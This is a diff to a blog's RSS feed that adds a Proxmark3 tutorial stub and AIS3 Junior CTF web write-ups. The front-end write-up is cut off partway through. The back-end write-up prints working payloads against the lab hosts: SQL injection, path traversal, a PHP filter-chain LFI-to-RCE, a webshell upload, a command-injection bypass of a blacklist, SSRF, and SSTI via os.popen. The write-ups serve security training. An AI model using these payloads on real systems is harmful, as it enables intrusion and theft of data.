@@ -7,7 +7,19 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en</language>
         <copyright>Chun-Hao Chung</copyright>
-        <lastBuildDate>Tue, 19 Aug 2025 00:00:00 +0800</lastBuildDate><atom:link href="https://agong88.github.io/en/tags/2025/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Sat, 25 Oct 2025 00:00:00 +0800</lastBuildDate><atom:link href="https://agong88.github.io/en/tags/2025/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Proxmark3 Chinese Tutorial</title>
+        <link>https://agong88.github.io/en/post/proxmark3-chinese-tutorial/</link>
+        <pubDate>Sat, 25 Oct 2025 00:00:00 +0800</pubDate>
+        
+        <guid>https://agong88.github.io/en/post/proxmark3-chinese-tutorial/</guid>
+        <description>&lt;img src="https://agong88.github.io/post/proxmark3-%E4%B8%AD%E6%96%87%E6%95%99%E5%AD%B8/1.jpg" alt="Featured image of post Proxmark3 Chinese Tutorial" /&gt;&lt;p&gt;This is my birthday present for myself (?)&lt;br&gt;
+I&amp;rsquo;ll post it later when I have time after selecting the articles.&lt;br&gt;
+Mainly because I saw there were no tutorials in Chinese, I wanted to write a detailed Chinese user manual.&lt;br&gt;
+I&amp;rsquo;ll see if I can write about next year&amp;rsquo;s Ironman race.&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>2025 Education System Cybersecurity Attack and Defense Inspector </title>
         <link>https://agong88.github.io/en/post/2025-education-system-cybersecurity-attack-and-defense-inspector/</link>
         <pubDate>Tue, 19 Aug 2025 00:00:00 +0800</pubDate>
@@ -31,6 +43,801 @@ Full transportation reimbursement, and accommodation at pretty nice hotels too (
 		class=&#34;gallery-image&#34; 
 		data-flex-grow=&#34;112&#34;
 		data-flex-basis=&#34;270px&#34;
+	
+&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>2025 AIS3 Junior Web Back-end Writeup</title>
+        <link>https://agong88.github.io/en/post/2025-ais3-junior-web-back-end-writeup/</link>
+        <pubDate>Mon, 18 Aug 2025 00:00:00 +0800</pubDate>
+        
+        <guid>https://agong88.github.io/en/post/2025-ais3-junior-web-back-end-writeup/</guid>
+        <description>&lt;img src="https://agong88.github.io/post/2025-ais3-junior-%E5%BE%8C%E7%AB%AF%E3%84%89writeup/image.png" alt="Featured image of post 2025 AIS3 Junior Web Back-end Writeup" /&gt;&lt;h3 id=&#34;phpisbest&#34;&gt;phpisbest
+&lt;/h3&gt;&lt;p&gt;After entering, you will see the following codes&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/B1YY3MOOll.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;br&gt;
+Then you can use what you learned in class to convert it into an array, so that when you compare it, it will become a weak comparison, and it will be == 0&lt;br&gt;
+Payload:&lt;code&gt;https://chall.nckuctf.org:28106/?A[]=1&amp;amp;B[]=2&lt;/code&gt;&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/r1yGTfduxx.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;Flag:NCKUCTF{php_15_7h3_8357_14n9u493}&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h3 id=&#34;uploader-waf&#34;&gt;uploader-waf
+&lt;/h3&gt;&lt;p&gt;Use one line of php as well, but to bypass the .php restriction, use .PhP&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/Skz-uGvOgg.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;br&gt;
+Then change the file name in Burp and delete .png&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/BkbBoMw_xx.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;br&gt;
+Then read the file and try &lt;code&gt;ls /&lt;/code&gt;&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/SkFp9fw_ll.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;br&gt;
+Finally &lt;code&gt;cat%20/flag_NCA4jqt&lt;/code&gt;&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/HJe1jMwdle.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;Flag:NCKUCTF{w385h311_15_4_427_4nd_m491c}&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h3 id=&#34;pathwalker-waf&#34;&gt;Pathwalker Waf
+&lt;/h3&gt;&lt;p&gt;After entering, click on Kapo and it will say that the flag is in &lt;code&gt;/var/www/html/flag.php&lt;/code&gt;&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/SyX6yQDuxe.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;br&gt;
+First try plugging &lt;code&gt;?page=&lt;/code&gt;../&lt;code&gt; ![](https://hackmd.io/_uploads/Sy7mlXDuge.png) An error code appeared. Just keep plugging &lt;/code&gt;../```&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/S14Ux7vugg.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;Flag:NCKUCTF{p47h_724v32541_h45_4107_721ck}&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h3 id=&#34;lfi2rce&#34;&gt;lfi2rce
+&lt;/h3&gt;&lt;p&gt;After entering, I saw the flag is in root dir&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/H1g3lXP_xx.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;br&gt;
+I&amp;rsquo;m itching to delete cappo.php to see what happens.&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/HyWGZQP_ex.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;br&gt;
+If an error code appears, use the one taught in class.&lt;a class=&#34;link&#34; href=&#34;https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT/blob/main/test.php&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;pseudo protocol&lt;/a&gt;&lt;br&gt;
+:::spoiler pseudo protocol&lt;br&gt;
+php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.CP869.CSIBM1163|convert.iconv.ISO2022KR.UNICODE|convert.iconv.LATIN3.NAPLPS|convert.iconv.ISO-IR-156.UNICODEBIG|convert.iconv.ISO885915.CSISO90|convert.iconv.ISO-IR-156.8859_9|convert.iconv.CSISOLATINGREEK.MSCP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.CP922.CSISOLATIN5|convert.iconv.ISO2022KR.UTF-32|convert.iconv.IBM912.ISO-IR-156|convert.iconv.ISO-IR-99.CSEUCPKDFMTJAPANESE|convert.iconv.8859_9.ISO_6937-2|convert.iconv.CSISO99NAPLPS.CP902|convert.iconv.ISO-IR-143.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.PT154.874|convert.iconv.CSISO2022KR.UTF-32|convert.iconv.CSIBM901.ISO_6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.CSISO2022KR.UTF16|convert.iconv.LATIN6.CSUCS4|convert.iconv.UTF-32BE.ISO_6937-2:1983|convert.iconv.ISO-IR-111.CSWINDOWS31J|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.BIGFIVE.UTF32|convert.iconv.WINSAMI2.T.61|convert.iconv.CSA_T500.EUCJP-WIN|convert.iconv.CP855.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.BIGFIVE.UTF32|convert.iconv.WINSAMI2.T.61|convert.iconv.CSISO90.UCS-4BE|convert.iconv.OSF00010004.UTF32|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.BIGFIVE.UTF32|convert.iconv.WINSAMI2.T.61|convert.iconv.CSISO90.ISO-10646/UTF-8|convert.iconv.BALTIC.SHIFT_JISX0213|convert.iconv.CP949.CP1361|convert.iconv.CSISOLATIN2.T.61|convert.iconv.IBM932.BIG-5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.BIGFIVE.UTF32|convert.iconv.WINSAMI2.T.61|convert.iconv.ISO-IR-156.CSUCS4|convert.iconv.KOI8-T.CSIBM932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.BIGFIVE.UTF32|convert.iconv.WINSAMI2.T.61|convert.iconv.NAPLPS.UCS-4|convert.iconv.ISO_8859-4.T.618BIT|convert.iconv.CSISO103T618BIT.BIG5-HKSCS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.CP869.CSIBM1163|convert.iconv.ISO2022KR.UNICODE|convert.iconv.LATIN3.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.CP869.CSIBM1163|convert.iconv.ISO2022KR.UNICODE|convert.iconv.LATIN3.NAPLPS|convert.iconv.ISO-IR-156.UNICODEBIG|convert.iconv.ISO885915.CSISO90|convert.iconv.BIGFIVE.CSIBM943|convert.iconv.LATIN6.WINDOWS-1258|convert.iconv.CP1258.CSISO103T618BIT|convert.iconv.NAPLPS.OSF10020359|convert.iconv.WINDOWS-1256.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-GR.UNICODE|convert.iconv.ISO_8859-14:1998.UTF32BE|convert.iconv.OSF00010009.ISO2022JP2|convert.iconv.UTF16.ISO-10646/UTF-8|convert.iconv.UTF-16.UTF8|convert.iconv.ISO_8859-14:1998.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.CP869.CSIBM1163|convert.iconv.ISO2022KR.UNICODE|convert.iconv.LATIN3.NAPLPS|convert.iconv.ISO-IR-156.UNICODEBIG|convert.iconv.ISO885915.CSISO90|convert.iconv.BIGFIVE.CSIBM943|convert.iconv.LATIN6.WINDOWS-1258|convert.iconv.CP1258.CSISO103T618BIT|convert.iconv.NAPLPS.OSF10020359|convert.iconv.WINDOWS-1256.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.CP922.CSISOLATIN5|convert.iconv.ISO2022KR.UTF-32|convert.iconv.IBM912.ISO-IR-156|convert.iconv.ISO-IR-103.CSEUCPKDFMTJAPANESE|convert.iconv.OSF00010002.UNICODE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.BIGFIVE.UTF32|convert.iconv.WINSAMI2.T.61|convert.iconv.ISO-IR-99.CSEUCPKDFMTJAPANESE|convert.iconv.CSEUCKR.UTF-32|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.BIGFIVE.UTF32|convert.iconv.WINSAMI2.T.61|convert.iconv.ISO-IR-156.CSUCS4|convert.iconv.KOI8-T.CSIBM932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.BIGFIVE.UTF32|convert.iconv.WINSAMI2.T.61|convert.iconv.CSISO90.UCS-4BE|convert.iconv.OSF00010004.UTF32|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO-IR-6.ISO646-DE|convert.iconv.ISO2022KR.UTF32|convert.iconv.MAC-UK.ISO-10646|convert.iconv.UCS-4BE.855|convert.iconv.ISO88599.CSISO90|convert.iconv.ISO_6937:1992.10646-1:1993|convert.iconv.CP773.UNICODE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UK.852|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.CP922.CSISOLATIN5|convert.iconv.ISO2022KR.UTF-32|convert.iconv.IBM912.ISO-IR-156|convert.iconv.ISO-IR-99.CSEUCPKDFMTJAPANESE|convert.iconv.8859_9.ISO_6937-2|convert.iconv.ISO6937.UCS-2LE|convert.iconv.CP864.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.CP869.CSIBM1163|convert.iconv.ISO2022KR.UNICODE|convert.iconv.LATIN3.NAPLPS|convert.iconv.ISO-IR-156.UNICODEBIG|convert.iconv.ISO885915.CSISO90|convert.iconv.ISO-IR-156.8859_9|convert.iconv.CSISOLATINGREEK.MSCP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.BIGFIVE.UTF32|convert.iconv.WINSAMI2.T.61|convert.iconv.ISO-IR-156.CSUCS4|convert.iconv.KOI8-T.CSIBM932|convert.iconv.CSIBM932.IBM866NAV|convert.iconv.IBM775.UTF32|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.BIGFIVE.UTF32|convert.iconv.WINSAMI2.T.61|convert.iconv.ISO-IR-156.CSUCS4|convert.iconv.KOI8-T.CSIBM932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.BIGFIVE.UTF32|convert.iconv.WINSAMI2.T.61|convert.iconv.ISO-IR-156.CSUCS4|convert.iconv.KOI8-T.CSIBM932|convert.iconv.CSIBM932.IBM866NAV|convert.iconv.IBM775.UTF32|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO-IR-6.ISO646-DE|convert.iconv.ISO2022KR.UTF32|convert.iconv.MAC-UK.ISO-10646|convert.iconv.UCS-4BE.855|convert.iconv.ISO88599.CSISO90|convert.iconv.ISO_6937:1992.10646-1:1993|convert.iconv.CP773.UNICODE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.BIGFIVE.UTF32|convert.iconv.WINSAMI2.T.61|convert.iconv.ISO-IR-156.OSF00010104|convert.iconv.CP860.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO-IR-6.ISO646-DE|convert.iconv.ISO2022KR.UTF32|convert.iconv.MAC-UK.ISO-10646|convert.iconv.UTF-32BE.MS936|convert.iconv.8859_5.UTF32|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.CP922.CSISOLATIN5|convert.iconv.ISO2022KR.UTF-32|convert.iconv.IBM912.ISO-IR-156|convert.iconv.ISO-IR-99.CSEUCPKDFMTJAPANESE|convert.iconv.8859_9.ISO_6937-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-GR.UNICODE|convert.iconv.ISO_8859-14:1998.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.CP869.CSIBM1163|convert.iconv.ISO2022KR.UNICODE|convert.iconv.LATIN3.NAPLPS|convert.iconv.ISO-IR-90.UTF16LE|convert.iconv.IBM874.UNICODEBIG|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.BIGFIVE.UTF32|convert.iconv.WINSAMI2.T.61|convert.iconv.ISO-IR-103.ISO-IR-209|convert.iconv.8859_5.CSISO2022JP2|convert.iconv.ISO-2022-JP-3.IBM-943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.CSISO2022KR.UTF16|convert.iconv.LATIN6.CSUCS4|convert.iconv.UTF-32BE.ISO_6937-2:1983|convert.iconv.ISO-IR-111.CSWINDOWS31J|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/etc/passwd;&lt;br&gt;
+:::&lt;br&gt;
+Finally, add &lt;code&gt;1=os.system(&#39;&#39;)&lt;/code&gt; to get the webshell&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/r1FrcQuuel.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;Flag:NCKUCTF{w385h311_15_4_427}&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h3 id=&#34;dig-waf2&#34;&gt;dig-waf2
+&lt;/h3&gt;&lt;p&gt;I saw the code and knew that these were banned.&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/BJJHdED_gl.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$blacklist = [&amp;#39;|&amp;#39;, &amp;#39;&amp;amp;&amp;#39;, &amp;#39;;&amp;#39;, &amp;#39;&amp;gt;&amp;#39;, &amp;#39;&amp;lt;&amp;#39;, &amp;#34;\n&amp;#34;, &amp;#34; &amp;#34;, &amp;#39;flag&amp;#39;];
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Combining the above blacklists, we can spell out &lt;code&gt;payload=&#39;`cat${IFS}/f*`&#39;&lt;/code&gt;&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/rJcL18v_ll.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;Flag:NCKUCTF{d19_70015_15_m491c!}&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h3 id=&#34;login&#34;&gt;login
+&lt;/h3&gt;&lt;p&gt;After entering, open Magic and you will see this&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/BkurzmOOxl.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;br&gt;
+Then look at this to make up the payload&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/rkHcf7_dgx.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;br&gt;
+The preceding &lt;code&gt;&#39;&lt;/code&gt; and &lt;code&gt;)&lt;/code&gt; need to be closed, so the payload is &lt;code&gt;admin&#39;) OR 1=1 --#&lt;/code&gt;&lt;br&gt;
+Then type in any password.&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/Syc7mQddeg.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;Flag:NCKUCTF{SQL1nj3c710n_1s_S0_l33t}&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h3 id=&#34;sqli-unoin&#34;&gt;sqli unoin
+&lt;/h3&gt;&lt;p&gt;It is said to be UNION. When you first enter, use UNION to check the number of columns. It turns out there are three columns.&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/SJW8XNOOgg.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;br&gt;
+There are tips below&lt;code&gt;table:flags column:flag_value&lt;/code&gt;&lt;br&gt;
+So the payload is&lt;code&gt;https://chall.nckuctf.org:28303/?id=-1 UNION SELECT 1,flag_value,3 FROM flags--&lt;/code&gt;&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/r1HbVEu_lx.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;Flag:NCKUCTF{UNION_SELECT_FOO_FROM_BAR}&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h3 id=&#34;ssrf2&#34;&gt;ssrf2
+&lt;/h3&gt;&lt;p&gt;After entering, I saw that the source code needed to use httpbin.dev to access the intranet /internal-only&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/HyGoTNd_ll.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;br&gt;
+So the payload is&lt;code&gt;https://httpbin.dev/redirect-to?url=http://0/internal-only&lt;/code&gt;&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/HyNTT4dOge.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;Flag:NCKUCTF{y0u_4r3_r34lly_4_55rf_0p3n_r3d1r3c7_m4573r}&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h3 id=&#34;ssti-waf1&#34;&gt;SSTI-waf1
+&lt;/h3&gt;&lt;p&gt;After entering, I saw that the source code was blocked&lt;code&gt;_&lt;/code&gt;&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/HynXj7Odxx.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;br&gt;
+Then find a payload without _&lt;br&gt;
+payload:&lt;code&gt;{{request[&#39;application&#39;][&#39;\x5f\x5fglobals\x5f\x5f&#39;][&#39;\x5f\x5fbuiltins\x5f\x5f&#39;][&#39;\x5f\x5fimport\x5f\x5f&#39;](&#39;os&#39;)[&#39;popen&#39;](&#39;id&#39;)[&#39;read&#39;]()}}&lt;/code&gt;&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/BkUPi7_Olg.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;br&gt;
+Finally &lt;code&gt;cat /flag&lt;/code&gt;&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/S1m9jXuulx.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;Flag:NCKUCTF{SSTI_can_use_without__}&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;
+</description>
+        </item>
+        <item>
+        <title>2025 AIS3 Junior Web Front-end Writeup</title>
+        <link>https://agong88.github.io/en/post/2025-ais3-junior-web-front-end-writeup/</link>
+        <pubDate>Mon, 18 Aug 2025 00:00:00 +0800</pubDate>
+        
+        <guid>https://agong88.github.io/en/post/2025-ais3-junior-web-front-end-writeup/</guid>
+        <description>&lt;h2 id=&#34;lab1&#34;&gt;Lab1
+&lt;/h2&gt;&lt;h3 id=&#34;get-ahead&#34;&gt;GET aHEAD
+&lt;/h3&gt;&lt;p&gt;The color change is because the HTTP Method is different.&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/SJOtUbIueg.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;br&gt;
+Then see what HTTP Method is supported&lt;br&gt;
+&lt;code&gt;curl -I http://mercury.picoctf.net:53554/&lt;/code&gt;&lt;br&gt;
+Hey, there is a Flag&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;Flag:picoCTF{r3j3ct_th3_du4l1ty_2e5ba39f}&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h3 id=&#34;cookies&#34;&gt;Cookies
+&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://hackmd.io/_uploads/B18eM-IOlx.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;br&gt;
+Initially, I noticed that the &lt;code&gt;name&lt;/code&gt; in the cookie is mutable, and each time a number is changed, the content is different. So, I started by counting 10 by 10 and found the maximum value, which is 30. So, I started looking from 1 and found a flag when &lt;code&gt;name=18&lt;/code&gt;.&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/SyhKzbIOxg.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;picoCTF{3v3ry1_l0v3s_c00k135_cc9110ba}&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h3 id=&#34;inspect-html&#34;&gt;Inspect HTML
+&lt;/h3&gt;&lt;p&gt;After entering &lt;code&gt;Ctrl+U&lt;/code&gt;&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/S1yGXbI_el.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;Flag:picoCTF{1n5p3t0r_0f_h7ml_1fd8425b}&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h3 id=&#34;bookmarklet&#34;&gt;Bookmarklet
+&lt;/h3&gt;&lt;p&gt;When you see the JS code, copy it to Online JS and execute it.&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/BJt6mZIOex.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;Flag:picoCTF{p@g3_turn3r_e8b2d43b}&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h3 id=&#34;webdecode&#34;&gt;WebDecode
+&lt;/h3&gt;&lt;p&gt;After entering, read the source code first. If you find it missing, read about&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/rJvtVZIdxx.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;br&gt;
+There is something that looks like base64, so decode it and see&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/r1M3Eb8uel.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;Flag:picoCTF{web_succ3ssfully_d3c0ded_07b91c79}&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h2 id=&#34;lab2&#34;&gt;Lab2
+&lt;/h2&gt;&lt;h3 id=&#34;challenge-1&#34;&gt;challenge-1
+&lt;/h3&gt;&lt;p&gt;First &lt;code&gt;ls&lt;/code&gt; to see what&amp;rsquo;s inside&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/S1MH9gI_gl.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;br&gt;
+Then &lt;code&gt;cat flag&lt;/code&gt;&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/HybdceLuex.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;Flag:AIS3{C0N9_Y0UR_F1R57_F1A9_😼}&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h3 id=&#34;challenge-2&#34;&gt;challenge-2
+&lt;/h3&gt;&lt;p&gt;Same as &lt;code&gt;ls&lt;/code&gt; start&lt;br&gt;
+Hey, that&amp;rsquo;s the &lt;code&gt;ls -al&lt;/code&gt;&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/S1MmieL_gg.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;br&gt;
+&lt;code&gt;cat .flag&lt;/code&gt;&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/BJySsgIdeg.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;Flag:AIS3{15_a1_W0N7_M155_D07_🚩}&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h3 id=&#34;challenge-3&#34;&gt;challenge-3
+&lt;/h3&gt;&lt;p&gt;Same as &lt;code&gt;ls&lt;/code&gt; and &lt;code&gt;cat flag&lt;/code&gt;&lt;br&gt;
